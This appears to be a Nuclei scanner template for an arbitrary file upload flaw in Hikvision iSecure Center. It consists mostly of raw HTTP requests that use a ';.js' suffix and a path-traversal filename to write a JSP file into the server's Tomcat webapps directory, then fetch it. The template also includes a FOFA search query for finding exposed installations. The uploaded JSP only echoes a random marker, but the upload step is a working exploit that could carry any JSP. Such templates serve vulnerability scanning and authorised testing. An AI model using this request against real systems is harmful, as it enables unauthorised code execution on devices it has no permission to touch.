http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(body_2, "{{payload}}")
    type: dsl
  raw:
  - 'POST /center/api/files;.js HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei

    User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like
    Gecko) Chrome/41.0.2226.0 Safari/537.36


    ------WebKitFormBoundarygcflwtei

    Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/{{filename}}.jsp"

    Content-Type:image/jpeg


    {{print}}

    ------WebKitFormBoundarygcflwtei--

    '
  - 'GET /clusterMgr/{{filename}}.jsp;.js HTTP/1.1

    Host: {{Hostname}}

    '
id: hikvision-js-files-upload
info:
  author: Xc1Ym
  description: 'THikvision iSecure Center /center/api/files;.js has an arbitrary file
    upload vulnerability

    '
  metadata:
    fofa-query: "icon_hash=\"-808437027\",app=\"HIKVISION-\u7EFC\u5408\u5B89\u9632\
      \u7BA1\u7406\u5E73\u53F0\",title=\"\u7EFC\u5408\u5B89\u9632\u7BA1\u7406\u5E73\
      \u53F0\""
    max-request: 2
    verified: true
  name: Hikvision iSecure Center - File Upload
  reference:
  - https://zhuanlan.zhihu.com/p/639514473
  - https://mp.weixin.qq.com/s/DR9xbwnrpg6YYSTw5pIAhw
  - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/hikvision-files-upload.yaml
  severity: critical
  tags: fileupload,iot,hikvision,intrusive,vuln
variables:
  filename: '{{rand_base(6)}}'
  payload: '{{rand_base(6)}}'
  print: <%out.print("{{payload}}");%>
